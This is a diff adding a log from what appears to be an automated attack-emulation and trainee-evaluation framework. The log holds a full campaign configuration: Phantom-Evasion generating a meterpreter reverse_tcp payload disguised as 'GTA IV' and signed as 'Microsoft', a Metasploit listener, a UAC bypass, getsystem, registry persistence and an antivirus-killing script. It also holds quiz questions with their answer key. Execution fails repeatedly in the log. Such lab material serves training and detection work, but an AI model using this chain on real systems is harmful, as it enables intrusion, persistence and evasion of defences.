@@ -1,0 +1,162 @@
+2020-03-31 02:44:54,686- attack-thread - INFO - Property Not Found
+2020-03-31 02:44:54,748- attack-thread - INFO - ....................Parsing the Campaign....................
+2020-03-31 02:44:54,752- attack-thread - INFO - [{'TA24_T1345_P1': {'name': 'payload generation', 'tactic': 'Build_Capabilities', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'phantom-evasion', 'command-prefix': 'python3', 'folder-path': '/home/Tools/Phantom-Evasion/', 'absolute-path': '/home/Tools/Phantom-Evasion/phantom-evasion.py', 'input': [{'Please insert option': '1'}, {'Please insert option': '2'}, {'Please insert option': '2'}, {'Please insert payload number': '3'}, {'Press Enter to continue': ''}, {'Please insert LHOST': 'LHOST_$ref'}, {'Please insert LPORT': 'LPORT_$ref'}, {'Please insert output filename': 'PAYLOAD_NAME_$ref'}, {'Add multiple processes behaviour': 'n'}, {'Strip executable\\?': 'y'}, {'Sign executable\\?': 'y'}, {'use already existing certificate': 'y'}, {'Select a Certificate': '1'}, {'Insert sign software description': 'Microsoft'}, {'Press Enter to continue': ''}, {'Please insert option': '0'}], 'options': {'LHOST_$ref': 'LHOST_$ref', 'LPORT_$ref': 'LPORT_$ref', 'PAYLOAD_NAME_$ref': 'PAYLOAD_NAME_$ref'}}}, {'TA08_T1105_P1': {'name': 'copy_file_to_windows', 'tactic': 'Lateral_Movement', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'ansible', 'command-prefix': None, 'folder-path': None, 'absolute-path': None}}, {'TA01_T1091_P1': {'name': 'Payload_listener', 'tactic': 'Initial_Access', 'try_count': 3, 'spawn_seperate_session': True, 'type': 'listener', 'service': 'None', 'tool': 'metasploit', 'exploit': 'multi/handler', 'payload': 'windows/x64/meterpreter/reverse_tcp', 'options': {'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref->Build_Capabilities'}, 'separate-thread': 'yes'}}, {'TA02_T1059_P1': {'name': 'execute_file_on_windows', 'tactic': 'Execution', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'ansible', 'command-prefix': None, 'folder-path': None, 'absolute-path': None}}, {'TA04_T1088_P1': {'name': 'bypassuac_sluihijack', 'tactic': 'Privilege_Escalation', 'try_count': 3, 'spawn_seperate_session': False, 'tool': 'metasploit', 'exploit': 'windows/local/bypassuac_sluihijack', 'payload': 'windows/meterpreter/reverse_tcp', 'options': {'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref', 'SESSION': 'SESSION_$ref'}}}, {'TA04_T1134_P1': {'name': 'getsystem', 'tactic': 'Privilege_Escalation', 'try_count': 1, 'spawn_seperate_session': False, 'type': 'command', 'service': 'None', 'tool': 'meterpreter', 'command': 'getsystem'}}, {'TA03_T1060_P2': {'name': 'registry_persistence', 'tactic': 'Persistence', 'try_count': 1, 'spawn_seperate_session': False, 'tool': 'metasploit', 'post': 'windows/local/registry_persistence', 'payload': 'payload windows/x64/meterpreter/reverse_tcp', 'options': {'BLOB_REG_NAME': 'BLOB_REG_NAME_$ref', 'RUN_NAME': 'RUN_NAME_$ref', 'STARTUP': 'SYSTEM', 'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref', 'SESSION': 'SESSION_$ref'}}}, {'TA05_T1089_P2': {'name': 'killav', 'tactic': 'Defense_Evasion', 'try_count': 5, 'tool': 'meterpreter', 'type': 'script', 'script': 'post/windows/manage/killav'}}]
+2020-03-31 02:44:54,753- attack-thread - INFO - *****************************Check tools status*****************************
+2020-03-31 02:44:54,753- attack-thread - INFO - ['phantom-evasion', 'ansible', 'metasploit', 'ansible', 'metasploit', 'meterpreter', 'metasploit', 'meterpreter']
+2020-03-31 02:44:54,753- attack-thread - INFO - /home/Tools/Phantom-Evasion/phantom-evasion.py = [32mTrue[0m
+2020-03-31 02:44:54,754- attack-thread - INFO - ansible = [32mTrue[0m
+2020-03-31 02:44:54,754- attack-thread - INFO - msfconsole = [32mTrue[0m
+2020-03-31 02:44:54,754- attack-thread - INFO - ansible = [32mTrue[0m
+2020-03-31 02:44:54,755- attack-thread - INFO - msfconsole = [32mTrue[0m
+2020-03-31 02:44:54,755- attack-thread - INFO - meterpreter = [33mDEPENDS_ON_METASPLOIT[0m
+2020-03-31 02:44:54,755- attack-thread - INFO - msfconsole = [32mTrue[0m
+2020-03-31 02:44:54,755- attack-thread - INFO - meterpreter = [33mDEPENDS_ON_METASPLOIT[0m
+2020-03-31 02:44:54,778- attack-thread - INFO - ....................Spawning Phantom Evasion....................
+2020-03-31 02:44:54,778- attack-thread - INFO - Reason: payload generation
+2020-03-31 02:45:05,307- attack-thread - INFO - Please insert option: 1
+2020-03-31 02:45:05,965- attack-thread - INFO - Please insert option: 2
+2020-03-31 02:45:06,523- attack-thread - INFO - Please insert option: 2
+2020-03-31 02:45:08,084- attack-thread - INFO - Please insert payload number: 3
+2020-03-31 02:45:08,242- attack-thread - INFO - Press Enter to continue: 
+2020-03-31 02:45:08,398- attack-thread - INFO - Please insert LHOST: 192.168.18.61
+2020-03-31 02:45:08,451- attack-thread - INFO - Please insert LPORT: 42887
+2020-03-31 02:45:08,503- attack-thread - INFO - Please insert output filename: GTA IV
+2020-03-31 02:45:09,055- attack-thread - INFO - Add multiple processes behaviour: n
+2020-03-31 02:45:10,342- attack-thread - INFO - Strip executable\?: y
+2020-03-31 02:45:11,904- attack-thread - INFO - Sign executable\?: y
+2020-03-31 02:45:11,957- attack-thread - INFO - use already existing certificate: y
+2020-03-31 02:45:12,009- attack-thread - INFO - Select a Certificate: 1
+2020-03-31 02:45:12,061- attack-thread - INFO - Insert sign software description: Microsoft
+2020-03-31 02:45:13,358- attack-thread - INFO - Press Enter to continue: 
+2020-03-31 02:45:13,816- attack-thread - INFO - Please insert option: 0
+2020-03-31 02:45:13,817- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 02:45:13,818- attack-thread - WARNING - Mitre/Challenges/Build_Capabilities.json  not found
+2020-03-31 02:45:13,819- attack-thread - INFO - ******[Scenario-ID: TA24_T1345_P1Tactic: Build_Capabilities executed]******
+2020-03-31 02:45:24,457- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 02:45:24,457- attack-thread - WARNING - Mitre/Challenges/Lateral_Movement.json  not found
+2020-03-31 02:45:24,457- attack-thread - INFO - ******[Scenario-ID: TA08_T1105_P1Tactic: Lateral_Movement executed]******
+2020-03-31 02:45:24,538- attack-thread - INFO - No Exceptions Found
+2020-03-31 02:45:24,588- attack-thread - INFO - post not needed
+2020-03-31 02:45:24,605- attack-thread - INFO - exploit['LHOST'] not needed...
+2020-03-31 02:45:24,605- attack-thread - INFO - exploit['LPORT'] not needed...
+2020-03-31 02:45:24,605- attack-thread - INFO - payload['LPORT'] not needed...
+2020-03-31 02:45:24,656- attack-thread - INFO - cid: 28
+2020-03-31 02:45:24,656- attack-thread - INFO - Starting Another Thread
+2020-03-31 02:45:24,657- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-03-31 02:45:26,440- metasploit-thread - INFO - {'job_id': 44, 'uuid': 'jgsr7bf4'}
+2020-03-31 02:45:26,448- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:45:29,459- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:45:29,662- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 02:45:29,663- attack-thread - INFO - Appending Generalize questions_answers
+2020-03-31 02:45:29,663- attack-thread - INFO - Appending scenario-specific questions_answers
+2020-03-31 02:45:29,664- attack-thread - INFO - *****************************Questions*****************************
+2020-03-31 02:45:29,664- attack-thread - INFO - {'General_question_1': {' What is Ip address of Attacker?': 'LHOST_$ref'}, 'General_question_4': {" Write Attacker's port of listening?": 'LPORT_$ref'}, 'Question_1': {' Write the path of directory in which payload is present? ': 'generated_payload_destination_file_path_$ref'}, 'Question_2': {' What is the name of malicious software or service? ': 'PAYLOAD_NAME_$ref'}}
+2020-03-31 02:45:29,666- attack-thread - INFO - *****************************Actual Answers*****************************
+2020-03-31 02:45:29,666- attack-thread - INFO - ['192.168.18.61', 30811, '%USERPROFILE%\\Downloads\\', 'GTA IV']
+2020-03-31 02:45:29,698- attack-thread - INFO - evaluation id:5e8268f3e52c551b60c4b9fe
+2020-03-31 02:45:29,699- attack-thread - INFO - ************************Updating Evaluation form for user**********************
+2020-03-31 02:45:29,737- attack-thread - INFO - TA01_T1091_P1 has been appended in evaluation
+2020-03-31 02:45:29,737- attack-thread - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-03-31 02:45:29,757- attack-thread - INFO - command is GTA IV.exe
+2020-03-31 02:45:32,496- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:45:35,521- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:45:38,548- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:45:41,552- metasploit-thread - INFO - Do not re-execute: its just a listener!!!
+2020-03-31 02:45:41,581- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:45:42,599- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 02:45:42,600- attack-thread - WARNING - Mitre/Challenges/Execution.json  not found
+2020-03-31 02:45:42,600- attack-thread - INFO - ******[Scenario-ID: TA02_T1059_P1Tactic: Execution executed]******
+2020-03-31 02:45:42,622- attack-thread - INFO - ....................Executing Meterpreter Command...............................
+2020-03-31 02:45:42,622- attack-thread - CRITICAL - Exception Occured somewhere!!
+2020-03-31 02:45:42,622- attack-thread - INFO - ....................Going 1 step back........................
+2020-03-31 02:45:42,637- attack-thread - INFO - command is GTA IV.exe
+2020-03-31 02:45:44,600- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:45:47,608- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:45:50,620- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:45:53,643- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:45:55,575- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 02:45:55,575- attack-thread - WARNING - Mitre/Challenges/Execution.json  not found
+2020-03-31 02:45:55,575- attack-thread - INFO - ******[Scenario-ID: TA02_T1059_P1Tactic: Execution executed]******
+2020-03-31 02:45:55,596- attack-thread - INFO - ....................Executing Meterpreter Command...............................
+2020-03-31 02:45:55,597- attack-thread - CRITICAL - Exception Occured somewhere!!
+2020-03-31 02:45:55,597- attack-thread - INFO - ....................Going 2 step back........................
+2020-03-31 02:45:55,617- attack-thread - INFO - Exception Successfully Raised
+2020-03-31 02:45:55,617- attack-thread - INFO - Exception caught
+2020-03-31 02:45:55,617- attack-thread - INFO - No Exceptions Found
+2020-03-31 02:45:55,633- attack-thread - INFO - post not needed
+2020-03-31 02:45:55,651- attack-thread - INFO - exploit['LHOST'] not needed...
+2020-03-31 02:45:55,651- attack-thread - INFO - exploit['LPORT'] not needed...
+2020-03-31 02:45:55,651- attack-thread - INFO - payload['LPORT'] not needed...
+2020-03-31 02:45:55,679- attack-thread - INFO - cid: 29
+2020-03-31 02:45:55,679- attack-thread - INFO - Starting Another Thread
+2020-03-31 02:45:55,680- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-03-31 02:45:57,488- metasploit-thread - INFO - {'job_id': 45, 'uuid': 'szsaydvf'}
+2020-03-31 02:45:57,495- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:46:00,507- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:46:00,682- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 02:46:00,683- attack-thread - INFO - Appending Generalize questions_answers
+2020-03-31 02:46:00,684- attack-thread - INFO - Appending scenario-specific questions_answers
+2020-03-31 02:46:00,684- attack-thread - INFO - *****************************Questions*****************************
+2020-03-31 02:46:00,685- attack-thread - INFO - {'General_question_1': {' What is Ip address of Attacker?': 'LHOST_$ref'}, 'General_question_4': {" Write Attacker's port of listening?": 'LPORT_$ref'}, 'Question_1': {' Write the path of directory in which payload is present? ': 'generated_payload_destination_file_path_$ref'}, 'Question_2': {' What is the name of malicious software or service? ': 'PAYLOAD_NAME_$ref'}}
+2020-03-31 02:46:00,686- attack-thread - INFO - *****************************Actual Answers*****************************
+2020-03-31 02:46:00,686- attack-thread - INFO - ['192.168.18.61', 30811, '%USERPROFILE%\\Downloads\\', 'GTA IV']
+2020-03-31 02:46:00,707- attack-thread - INFO - evaluation id:5e8268f3e52c551b60c4b9fe
+2020-03-31 02:46:00,708- attack-thread - INFO - ************************Updating Evaluation form for user**********************
+2020-03-31 02:46:00,737- attack-thread - INFO - TA01_T1091_P1 has been appended in evaluation
+2020-03-31 02:46:00,737- attack-thread - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-03-31 02:46:00,757- attack-thread - INFO - command is GTA IV.exe
+2020-03-31 02:46:03,542- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:46:06,569- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:46:09,593- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:46:12,595- metasploit-thread - INFO - Do not re-execute: its just a listener!!!
+2020-03-31 02:46:12,622- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:46:13,439- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 02:46:13,439- attack-thread - WARNING - Mitre/Challenges/Execution.json  not found
+2020-03-31 02:46:13,439- attack-thread - INFO - ******[Scenario-ID: TA02_T1059_P1Tactic: Execution executed]******
+2020-03-31 02:46:13,480- attack-thread - INFO - ....................Executing Meterpreter Command...............................
+2020-03-31 02:46:13,480- attack-thread - CRITICAL - Exception Occured somewhere!!
+2020-03-31 02:46:13,480- attack-thread - INFO - ....................Going 3 step back........................
+2020-03-31 02:46:13,508- attack-thread - INFO - Exception Successfully Raised
+2020-03-31 02:46:13,508- attack-thread - INFO - Exception caught
+2020-03-31 02:46:19,976- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 02:46:19,977- attack-thread - WARNING - Mitre/Challenges/Lateral_Movement.json  not found
+2020-03-31 02:46:19,977- attack-thread - INFO - ******[Scenario-ID: TA08_T1105_P1Tactic: Lateral_Movement executed]******
+2020-03-31 02:46:20,031- attack-thread - INFO - No Exceptions Found
+2020-03-31 02:46:20,074- attack-thread - INFO - post not needed
+2020-03-31 02:46:20,092- attack-thread - INFO - exploit['LHOST'] not needed...
+2020-03-31 02:46:20,092- attack-thread - INFO - exploit['LPORT'] not needed...
+2020-03-31 02:46:20,092- attack-thread - INFO - payload['LPORT'] not needed...
+2020-03-31 02:46:20,120- attack-thread - INFO - cid: 30
+2020-03-31 02:46:20,120- attack-thread - INFO - Starting Another Thread
+2020-03-31 02:46:20,121- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-03-31 02:46:21,904- metasploit-thread - INFO - {'job_id': 46, 'uuid': 'r0lwnjaa'}
+2020-03-31 02:46:21,911- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:46:24,936- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:46:25,126- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 02:46:25,127- attack-thread - INFO - Appending Generalize questions_answers
+2020-03-31 02:46:25,128- attack-thread - INFO - Appending scenario-specific questions_answers
+2020-03-31 02:46:25,128- attack-thread - INFO - *****************************Questions*****************************
+2020-03-31 02:46:25,129- attack-thread - INFO - {'General_question_1': {' What is Ip address of Attacker?': 'LHOST_$ref'}, 'General_question_4': {" Write Attacker's port of listening?": 'LPORT_$ref'}, 'Question_1': {' Write the path of directory in which payload is present? ': 'generated_payload_destination_file_path_$ref'}, 'Question_2': {' What is the name of malicious software or service? ': 'PAYLOAD_NAME_$ref'}}
+2020-03-31 02:46:25,130- attack-thread - INFO - *****************************Actual Answers*****************************
+2020-03-31 02:46:25,130- attack-thread - INFO - ['192.168.18.61', 30811, '%USERPROFILE%\\Downloads\\', 'GTA IV']
+2020-03-31 02:46:25,175- attack-thread - INFO - evaluation id:5e8268f3e52c551b60c4b9fe
+2020-03-31 02:46:25,175- attack-thread - INFO - ************************Updating Evaluation form for user**********************
+2020-03-31 02:46:25,224- attack-thread - INFO - TA01_T1091_P1 has been appended in evaluation
+2020-03-31 02:46:25,225- attack-thread - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-03-31 02:46:25,263- attack-thread - INFO - command is GTA IV.exe
+2020-03-31 02:46:27,970- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:46:30,997- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:46:34,023- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:46:37,026- metasploit-thread - INFO - Do not re-execute: its just a listener!!!
+2020-03-31 02:46:37,053- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:46:38,849- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 02:46:38,849- attack-thread - WARNING - Mitre/Challenges/Execution.json  not found
+2020-03-31 02:46:38,849- attack-thread - INFO - ******[Scenario-ID: TA02_T1059_P1Tactic: Execution executed]******
+2020-03-31 02:46:38,866- attack-thread - INFO - ....................Executing Meterpreter Command...............................
+2020-03-31 02:46:38,866- attack-thread - CRITICAL - Exception Occured somewhere!!
+2020-03-31 02:46:38,866- attack-thread - INFO - ....................Going 4 step back........................
+2020-03-31 02:46:38,886- attack-thread - INFO - Exception Successfully Raised
+2020-03-31 02:46:38,886- attack-thread - INFO - Exception caught
+2020-03-31 02:46:38,987- attack-thread - INFO - ....................Spawning Phantom Evasion....................
+2020-03-31 02:46:38,987- attack-thread - INFO - Reason: payload generation
+2020-03-31 02:46:38,988- attack-thread - INFO - ['LPORT'] option not needed...
